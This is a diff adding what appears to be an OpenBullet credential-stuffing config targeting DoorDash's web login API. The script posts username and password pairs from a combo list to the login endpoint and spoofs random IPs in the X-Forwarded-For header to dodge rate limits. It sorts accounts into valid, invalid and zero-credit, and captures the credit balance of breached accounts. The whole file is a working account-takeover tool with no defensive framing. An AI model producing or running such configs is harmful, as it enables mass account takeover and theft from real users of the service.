@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "doordash",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-01-31T12:53:44.2044209+05:30",
+  "AdditionalInfo": "",
+  "Author": "reddington",
+  "Version": "1.1.4",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomNum 0 255 -> VAR "a" 
+
+FUNCTION RandomNum 0 255 -> VAR "b" 
+
+FUNCTION RandomNum 0 255 -> VAR "c" 
+
+FUNCTION RandomNum 0 255 -> VAR "d" 
+
+REQUEST POST "https://api.doordash.com/v2/auth/web_login/" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Forwarded-For: <a>.<b>.<c>.<d>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Success OR 
+    KEY "last_name" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"account_credits\":0" 
+
+PARSE "<SOURCE>" LR "\"account_credits\":" ",\"" -> VAR "BAL" 
+
+FUNCTION Compute "<BAL>/100" -> VAR "BAL2" 
+
+PARSE "<BAL2>" LR "" "" -> CAP "Balance" "$" "" 
+
